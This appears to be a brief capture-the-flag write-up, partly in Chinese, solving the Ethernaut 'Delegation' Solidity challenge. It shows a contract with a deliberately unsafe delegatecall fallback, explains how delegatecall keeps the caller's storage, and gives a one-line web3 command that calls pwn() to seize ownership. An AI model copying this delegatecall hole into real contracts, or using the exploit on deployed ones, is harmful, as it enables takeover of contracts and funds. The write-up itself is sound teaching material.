## 0x01 Task

claim ownership

```javascript
pragma solidity ^0.4.18;

contract Delegate {

  address public owner; // occupies slot 0

  function Delegate(address _owner) public {
    owner = _owner;
  }

    // 我的目标就是要调用这个函数
  function pwn() public {
    owner = msg.sender; // save msg.sender to slot 0
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  function Delegation(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  function() public {
    if(delegate.delegatecall(msg.data)) {
      this;
    }
  }
}
```

## 0x02 Solution

`Delegatecall`

delegate是一个特殊函数调用，通常调用的是其他库或其他合约中的函数。

`delegatecall()`的优势在于能够保存现状态的合约内容（包括`storage`/`msg.sender`/`msg.values`等）

delegatecall的调用方式是通过函数名hash后的前4个bytes来确定调用函数的

```javascript
//sha3的返回值前两个为0x，所以要切0-10个字符。
contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)});
```

